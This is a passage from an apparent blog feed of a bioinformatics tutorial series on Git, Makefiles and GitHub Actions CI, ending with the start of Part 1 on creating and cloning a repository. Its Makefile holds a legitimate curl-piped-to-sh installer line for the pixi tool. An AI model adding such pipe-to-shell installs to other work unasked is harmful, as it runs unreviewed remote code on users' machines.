<p>So far, everything has been done locally. However, when you add new features—for example, adding <code>trimmomatic</code> to trim the FastQC files—you need to run the tests again to ensure they can be executed without errors. This is the simplest testing practice for developing bioinformatics projects.</p>
<p>GitHub provides GitHub Actions to help with this:</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><ul>
<li class="">For more detailed examples on GitHub Actions, follow the official documentation: <a href="https://docs.github.com/en/actions/get-started/quickstart" target="_blank" rel="noopener noreferrer" class="">https://docs.github.com/en/actions/get-started/quickstart</a></li>
<li class="">Here, we introduce how it works and how we can apply it simply</li>
</ul></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="create-github-action-files">Create GitHub Action files<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#create-github-action-files" class="hash-link" aria-label="Direct link to Create GitHub Action files" title="Direct link to Create GitHub Action files" translate="no">​</a></h3>
<p>Create a new branch for CI/CD:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout main</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> pull</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> switch </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> feature/cicd</span><br></span></code></pre></div></div>
<p>Configure the workflow:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> .github/workflows</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># create workflow file</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> </span><span class="token string bash punctuation operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> .github/workflows/test-e2e.yaml</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">name: Testing e2e</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">on:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  push:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">    branches: [ main ]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  pull_request:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">    branches: [ main ]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">jobs:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">  clone:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">    runs-on: ubuntu-latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">    steps:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">      - name: Checkout repository</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">        uses: actions/checkout@v4</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">      - name: Running testing</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">        run: |</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">          make test-e2e</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><br></span></code></pre></div></div>
<p>What it does:</p>
<ul>
<li class="">Runs workflow named Testing e2e</li>
<li class="">Triggers on pull requests to main</li>
<li class="">Triggers on push or merge into main</li>
<li class="">Starts a job on ubuntu-latest runner</li>
<li class="">Clones the repository using actions/checkout</li>
<li class="">Runs end-to-end tests via make test-e2e</li>
<li class="">Passes if tests succeed</li>
<li class="">Fails if tests return a non-zero exit code</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-github-actions-locally">Running GitHub Actions locally<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#running-github-actions-locally" class="hash-link" aria-label="Direct link to Running GitHub Actions locally" title="Direct link to Running GitHub Actions locally" translate="no">​</a></h3>
<p>If we only run tests when creating a PR or pushing to <code>main</code>, you may make mistakes and create many commits just to trigger testing. Here, we can use <code>act</code>, a local command line tool that can help:</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><ul>
<li class="">For more details on how to use <code>act</code>: <a href="https://nektosact.com/" target="_blank" rel="noopener noreferrer" class="">https://nektosact.com</a></li>
<li class="">Install Docker on your local machine first</li>
</ul></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># install</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> act</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># run e2e test locally, it will run this on your local machine</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-W</span><span class="token plain"> .github/workflows/test-e2e.yaml</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="act_failed" src="https://riverxdata.github.io/river-docs/assets/images/act_failed-afc9d4fa6bcd8fd64420bfe5598a61d5.png" width="1519" height="864" class="img_ev3q"></p>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>warning</div><div class="admonitionContent_BuS1"><ul>
<li class="">As you can see, it failed because pixi is not installed. This is because the <code>make test-e2e</code> target does not trigger pixi installation</li>
<li class="">Also, there is a wrong URL for installing pixi: <code>https://pixi.dev/install.sh</code> should be replaced with <code>https://pixi.sh/install.sh</code></li>
<li class="">You should add pixi installation as a dependency for <code>test-e2e</code></li>
</ul></div></div>
<p>Update dependencies of <code>test-e2e</code> in the <code>Makefile</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">.PHONY: test-e2e clean</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sSL</span><span class="token plain"> https://pixi.sh/install.sh </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">data/GSE110004:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> data/GSE110004</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> data/GSE110004 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> https://raw.githubusercontent.com/nf-core/test-datasets/rnaseq/testdata/GSE110004/SRR6357070_1.fastq.gz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> https://raw.githubusercontent.com/nf-core/test-datasets/rnaseq/testdata/GSE110004/SRR6357070_2.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-e2e: data/GSE110004 </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi run </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> main.sh data/GSE110004/*_1.fastq.gz data/GSE110004/*_2.fastq.gz result</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">clean:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> data/GSE110004</span><br></span></code></pre></div></div>
<p>Now you can rerun to test successfully, as shown below:
<img decoding="async" loading="lazy" alt="act_success1" src="https://riverxdata.github.io/river-docs/assets/images/act_success1-c6c94a384f9f52c48c288f723338945c.png" width="1519" height="864" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="act_success2" src="https://riverxdata.github.io/river-docs/assets/images/act_success2-66c5e05f88d51a5c3604ba0fa4fd927a.png" width="1519" height="864" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-cicd-in-bioinformatics">What is CI/CD in bioinformatics?<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#what-is-cicd-in-bioinformatics" class="hash-link" aria-label="Direct link to What is CI/CD in bioinformatics?" title="Direct link to What is CI/CD in bioinformatics?" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-is-cicd-in-software-development">What is CI/CD in software development<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#what-is-cicd-in-software-development" class="hash-link" aria-label="Direct link to What is CI/CD in software development" title="Direct link to What is CI/CD in software development" translate="no">​</a></h3>
<p><img decoding="async" loading="lazy" alt="cicd" src="https://riverxdata.github.io/river-docs/assets/images/cicd-85c944e1969870ad96df0a1b7d04d315.webp" width="825" height="399" class="img_ev3q">
Reference: <a href="https://viblo.asia/p/cau-hinh-cicd-voi-github-phan-1-mot-it-ly-thuyet-Qbq5Q9NL5D8" target="_blank" rel="noopener noreferrer" class="">https://viblo.asia/p/cau-hinh-cicd-voi-github-phan-1-mot-it-ly-thuyet-Qbq5Q9NL5D8</a></p>
<p>What exactly are CI (Continuous Integration) and CD (Continuous Delivery)? These terms are commonly used in software development.
In the figure above, software can be developed with many new features, which will trigger specific jobs with actions.
For example, we can the workflow to clone the repository on a GitHub Actions instance and run tests. This approach depends on many use cases.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-does-it-work-in-bioinformatics">How does it work in bioinformatics?<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#how-does-it-work-in-bioinformatics" class="hash-link" aria-label="Direct link to How does it work in bioinformatics?" title="Direct link to How does it work in bioinformatics?" translate="no">​</a></h3>
<p>That is exactly what I showed you above. If you want to develop software, follow the standard CI/CD software development process. In contrast,
bioinformatics typically combines these tools together. This means they will run scripts (bash, Nextflow, WDL, Snakemake, etc.) to combine tools
in a workflow manner. The release is the repository itself with the scripts inside (CD), while the CI is the process we set up to run
the pipeline with testing datasets.</p>
<p>Now you can create a PR, which will always trigger the testing that helps you validate whether your changes may fail the pipeline.
<img decoding="async" loading="lazy" alt="PR_GHA" src="https://riverxdata.github.io/river-docs/assets/images/PR_GHA-3f6f906f7d1600d69ba6fe6bd331ffe3.png" width="1061" height="1071" class="img_ev3q"></p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">Use secrets in <code>Settings</code> to work with credentials (passwords, usernames, keys)</li>
<li class="">Use the Makefile to help sync the local environment with the GitHub Actions environment. This makes it easy to change the CI/CD runner</li>
<li class="">Use matrix strategy to run tests faster</li>
</ul></div></div>
<p>Check GitHub Actions logs for debugging:
<img decoding="async" loading="lazy" alt="GHA" src="https://riverxdata.github.io/river-docs/assets/images/GHA_log-275ac35c8fdbaf250724faba33aaee7c.png" width="1381" height="1356" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="review">Review<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#review" class="hash-link" aria-label="Direct link to Review" title="Direct link to Review" translate="no">​</a></h2>
<p>In this tutorial, we explored how to transform a basic bioinformatics project into a reproducible, testable pipeline using Git, Makefiles, and CI/CD practices. Here are the key takeaways:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="git-commands-for-project-management">Git Commands for Project Management<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#git-commands-for-project-management" class="hash-link" aria-label="Direct link to Git Commands for Project Management" title="Direct link to Git Commands for Project Management" translate="no">​</a></h3>
<ul>
<li class="">Use <code>git log</code> and <code>git log --oneline</code> to view commit history</li>
<li class="">Checkout to specific commits to track development progress</li>
<li class="">Use <code>git diff</code> to compare changes between commits or branches</li>
<li class="">Roll back to original states with <code>git checkout -- .</code></li>
<li class="">Copy files from other branches using <code>git checkout &lt;branch&gt; &lt;file&gt;</code></li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="makefile-automation">Makefile Automation<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#makefile-automation" class="hash-link" aria-label="Direct link to Makefile Automation" title="Direct link to Makefile Automation" translate="no">​</a></h3>
<ul>
<li class="">Create targets for data download (<code>make data</code>) and cleanup (<code>make clean</code>)</li>
<li class="">Add test targets (<code>make test-e2e</code>) that chain dependencies together</li>
<li class="">Ensure reproducibility by standardizing commands across environments</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="workflow-scripts">Workflow Scripts<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#workflow-scripts" class="hash-link" aria-label="Direct link to Workflow Scripts" title="Direct link to Workflow Scripts" translate="no">​</a></h3>
<ul>
<li class="">Create bash scripts that accept command-line arguments</li>
<li class="">Combine tools like FastQC and MultiQC in a workflow</li>
<li class="">Test workflows locally before pushing to remote</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cicd-with-github-actions">CI/CD with GitHub Actions<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#cicd-with-github-actions" class="hash-link" aria-label="Direct link to CI/CD with GitHub Actions" title="Direct link to CI/CD with GitHub Actions" translate="no">​</a></h3>
<ul>
<li class="">Create workflow files in <code>.github/workflows/</code></li>
<li class="">Trigger tests on push to main or pull requests</li>
<li class="">Use the same Makefile commands in CI as in local development</li>
<li class="">Check GitHub Actions logs for debugging failed tests</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="local-testing-with-act">Local Testing with <code>act</code><a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#local-testing-with-act" class="hash-link" aria-label="Direct link to local-testing-with-act" title="Direct link to local-testing-with-act" translate="no">​</a></h3>
<ul>
<li class="">Test GitHub Actions workflows locally using <code>act</code></li>
<li class="">Catch issues before pushing to remote repositories</li>
<li class="">Reduce the number of commits needed to fix CI failures</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cicd-in-bioinformatics-context">CI/CD in Bioinformatics Context<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#cicd-in-bioinformatics-context" class="hash-link" aria-label="Direct link to CI/CD in Bioinformatics Context" title="Direct link to CI/CD in Bioinformatics Context" translate="no">​</a></h3>
<ul>
<li class="">Unlike traditional software, bioinformatics CI/CD often focuses on pipeline validation</li>
<li class="">The "delivery" is often the repository itself with reproducible workflows</li>
<li class="">Testing involves running entire pipelines on test datasets</li>
<li class="">This ensures changes don't break existing analyses</li>
</ul>
<p>By implementing these practices, you create a robust bioinformatics project that is:</p>
<ul>
<li class=""><strong>Reproducible</strong>: Anyone can reproduce your results on any machine</li>
<li class=""><strong>Testable</strong>: Automated tests catch errors before they reach production</li>
<li class=""><strong>Maintainable</strong>: Clear history and documentation make updates easier</li>
<li class=""><strong>Collaborative</strong>: CI/CD ensures all changes are validated before merging</li>
</ul>
<p>Ready to implement CI/CD in your own bioinformatics projects? Start by adding a simple Makefile target, then gradually build up your testing and automation capabilities.</p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="git" term="git"/>
        <category label="version-control" term="version-control"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="reproducibility" term="reproducibility"/>
        <category label="pipelines" term="pipelines"/>
        <category label="ci-cd" term="ci-cd"/>
        <category label="github-actions" term="github-actions"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[The Evolution of Version Control - Git's Role in Reproducible Bioinformatics (Part 1)]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1</id>
        <link href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1"/>
        <updated>2026-01-15T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[In Part 1 (this post), we explore the history of Git, its integration with GitHub, and basic hands-on tutorials. Part 2 (coming soon) will cover real-world bioinformatics examples and advanced workflows with best practices.]]></summary>
        <content type="html"><![CDATA[<p>In Part 1 (this post), we explore the history of Git, its integration with GitHub, and basic hands-on tutorials. Part 2 (coming soon) will cover real-world bioinformatics examples and advanced workflows with best practices.</p>
<p>This part focuses on practical applications, including NGS quality control using multiqc and fastqc.</p>
<ul>
<li class=""><strong>Part 1 (This Post)</strong>: History, basics, GitHub integration, and hands-on tutorials</li>
<li class=""><strong>Part 2 (Coming Soon)</strong>: Real-world bioinformatics examples and advanced workflows with best practices</li>
</ul>
<p>Here I provide a real-world example of how to create a simple repository that enables reproducible work for NGS short read data quality control. I'll explain each step using a GitHub repository.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="create-a-repository">Create a Repository<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#create-a-repository" class="hash-link" aria-label="Direct link to Create a Repository" title="Direct link to Create a Repository" translate="no">​</a></h2>
<p>As the creator, you are the admin of the repository. You can configure permissions to control who can read or modify it. Here are some common setup tips:</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class=""><strong>Visibility</strong>: If you want to share your work with the community, use <code>public</code>. Otherwise, use <code>private</code></li>
<li class=""><strong>Add README</strong>: A README file helps others understand how your repository is structured. Beyond the standard <code>README.md</code> for general users, consider adding <code>README.developer.md</code> for developer-specific information</li>
<li class=""><strong>.gitignore</strong>: This file specifies which files or folders should not be pushed to GitHub</li>
<li class=""><strong>License</strong>: This determines how others can use your work. For example, MIT allows free usage, while other licenses may require purchase for commercial use</li>
</ul></div></div>
<p><img decoding="async" loading="lazy" alt="create_repo" src="https://riverxdata.github.io/river-docs/assets/images/create_repository-e2056ec5eb975ee5076cc215b76581cf.png" width="802" height="1235" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="clone">Clone<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1#clone" class="hash-link" aria-label="Direct link to Clone" title="Direct link to Clone" translate="no">​</a></h2>
<p>Cloning creates a copy of your repository on your local computer. When working in a team, each member has their own local copy. GitHub serves as a central location, similar to Google Drive, that allows you to sync your source code.</p>
<p>GitHub provides SSH protocol authentication for downloading resources, but it doesn't work like a remote server with shell access.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><ul>
<li class="">After creating a repository, clone it to start working</li>
<li class="">You'll need to authenticate with GitHub on your local computer or HPC first. I recommend using SSH keys</li>
<li class="">Click the green "Code" button, select the "SSH" tab, copy the URL, and use it to clone the repository</li>
</ul></div></div>
<p><img decoding="async" loading="lazy" alt="created" src="https://riverxdata.github.io/river-docs/assets/images/created_clone-847299d374b67dd2ead6159ab13ca0d2.png" width="1973" height="911" class="img_ev3q"></p>
<p>For authentication, follow the official GitHub documentation: <a href="https://docs.github.com/en/authentication/connecting-to-github-with-ssh/adding-a-new-ssh-key-to-your-github-account" target="_blank" rel="noopener noreferrer" class="">https://docs.github.com/en/authentication/connecting-to-github-with-ssh/adding-a-new-ssh-key-to-your-github-account</a></p>
